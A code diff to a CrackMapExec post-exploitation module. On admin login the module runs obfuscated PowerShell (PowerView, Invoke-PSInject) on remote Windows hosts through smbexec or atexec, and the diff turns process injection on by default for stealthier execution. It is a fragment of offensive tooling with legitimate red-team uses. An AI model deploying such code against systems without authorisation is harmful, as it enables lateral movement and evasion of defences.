@@ -13,16 +13,16 @@ class CMEModule:
 
     def  options(self, context, module_options):
         '''
-            INJECT    If set to true, this allows PowerView to work over 'stealthier' execution methods which have non-interactive contexts (e.g. WMI) (default: false)
+            INJECT    If set to true, this allows PowerView to work over 'stealthier' execution methods which have non-interactive contexts (e.g. WMI) (default: True)
         '''
 
         self.exec_methods = ['smbexec', 'atexec']
-        self.inject = False
+        self.inject = True
         if 'INJECT' in module_options:
             self.inject = bool(module_options['INJECT'])
 
         if self.inject: self.exec_methods = None
-        self.ps_script1 = obfs_ps_script('Invoke-PSInject.ps1')
+        self.ps_script1 = obfs_ps_script('cme_powershell_scripts/Invoke-PSInject.ps1')
         self.ps_script2 = obfs_ps_script('powersploit/Recon/PowerView.ps1')
 
     def on_admin_login(self, context, connection):
@@ -32,9 +32,7 @@ class CMEModule:
         if self.inject:
             launcher = gen_ps_inject(launcher, context, inject_once=True)
 
-        ps_command = create_ps_command(launcher)
-
-        connection.execute(ps_command, methods=self.exec_methods)
+        connection.ps_execute(launcher, methods=self.exec_methods)
 
         context.log.success('Executed launcher')
 
